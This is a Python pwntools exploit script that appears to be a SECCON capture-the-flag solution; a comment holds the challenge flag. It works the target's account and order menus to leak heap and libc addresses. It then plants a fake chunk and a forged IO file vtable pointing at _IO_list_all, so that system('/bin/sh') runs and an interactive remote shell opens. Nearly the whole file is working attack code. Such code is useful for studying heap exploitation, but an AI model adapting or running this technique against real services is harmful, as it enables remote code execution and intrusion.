#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

#host = "10.211.55.6"
#port = 8888
#SECCON{Y0u h4ve 4cquired the "H0use 0f L0re" techn0l0gy. by Lazenca.0x0}
host = "lazenca0x0.pwn.seccon.jp"
port = 9999
r = remote(host,port)


def login(user,passwd):
    r.recvuntil("Enter your ID.")
    r.recvuntil(">")
    r.send(user)
    r.recvuntil(">")
    r.send(passwd)

def new_account(user,passwd,profile):
    r.recvuntil("ID.")
    r.send(user)
    r.recvuntil(".")
    r.send(passwd)
    r.recvuntil(".")
    r.send(profile)

def enter_order():
    r.recvuntil("Command :")
    r.sendline("4")

def ret_order():
    r.recvuntil("Command :")
    r.sendline("5")

def add_order(idx):
    r.recvuntil("Command :")
    r.sendline("2")
    r.recvuntil(">")
    r.sendline(str(idx)) 

def cancel_order(idx):
    r.recvuntil("Command :")
    r.sendline("3")
    r.recvuntil("Candy code:")
    r.recvuntil("\n")
    r.sendline(str(idx))


def enter_acc():
    r.recvuntil("Command :")
    r.sendline("5")

def del_acc(idx):
    r.recvuntil("Command :")
    r.sendline("1")
    r.recvuntil("delete\n")
    r.sendline(str(idx))

def change_pw(idx,pw):
    r.recvuntil("Command :")
    r.sendline("2")
    r.recvuntil("PW\n")
    r.sendline(str(idx))
    r.recvuntil(".")
    r.send(pw)

def ret_acc():
    r.recvuntil("Command :")
    r.sendline("3")

def logout():
    r.recvuntil("Command :")
    r.sendline("9")
    r.recvuntil("1) No\n")
    r.sendline("0")

def purch(idx,num):
    r.recvuntil("Command :")
    r.sendline("2")
    r.recvuntil("purchased.")
    r.sendline(str(idx))
    r.recvuntil(".")
    r.sendline(str(num))

adname = "Admin"
adpassword = "admin"

login("a","b")

r.recvuntil("1) No")
r.sendline("0")


new_account("orange","ddaa","noggnogg")
login("Admin","admin")
enter_order()
add_order(0)
add_order(0)
cancel_order(0)
cancel_order(0)
add_order(0)
r.recvuntil("Order code  : ")
heap = (u64(r.recvuntil("\n")[:-1].ljust(8,"\x00")) & ~0xff) - 0x1200
print "heap:", hex(heap)
add_order(0)
ret_order()
enter_acc()
del_acc(2)
ret_acc()
enter_order()
add_order(0)
r.recvuntil("Order code  :")
r.recvuntil("Order code  :")
r.recvuntil("Order code  : ")
libc = (u64(r.recvuntil("\n")[:-1].ljust(8,"\x00")) & ~0xff) - 0x3c4b00 
print "libc:", hex(libc)

ret_order()

logout()
login("a","B")
r.recvuntil("1) No")
r.sendline("0")
new_account("da","da","nognog")

login("a","B")
r.recvuntil("1) No")
r.sendline("0")
new_account("da","da","nognog")
login("Admin","admin")



enter_acc()
del_acc(3)
ret_acc()
enter_order()
r.recvuntil("Command :")
r.sendline("4")
r.recvuntil("1) No\n")
r.sendline("0")
r.recvuntil("candy.")
r.sendline("1") #pric
r.recvuntil("candy.")
r.sendline("a"*0x40) #desc
add_order(0)
add_order(0)
add_order(0)
add_order(0)
add_order(0)
add_order(0)
ret_order()
purch(0,30)
r.recvuntil("candy.")
context.arch = "amd64"
system = libc + 0x45390
vtable_addr = heap+0x14e0
io_list_all = libc + 0x3c5520 
fake_chunk = flat(["/bin/sh\x00",0x61,0,heap+0x1480]) +p64(0) + p64(1)  +p64(0)*6 + p64(0) + p64(0x21) + p64(0)*3 + p64(0x11) + p64(0) + p64(io_list_all-0x10) + p64(heap+0x14b0) + p64(0)
fake_chunk += p64(0) + p64(0)*3 + p64(1) + p64(vtable_addr) + p64(system)*4 

fake_chunk += "c"*0x200

r.sendline(fake_chunk)
enter_acc()
del_acc(2)
ret_acc()
logout()
login("a","b")
r.recvuntil("1) No")
r.sendline("0")
new_account("da","da","nognog")
login("Admin","admin")
enter_acc()

fake_chunk_addr = heap + 0x1400

change_pw(3,p64(fake_chunk_addr))
ret_acc()
enter_order()
add_order(0)
add_order(0)

r.interactive()
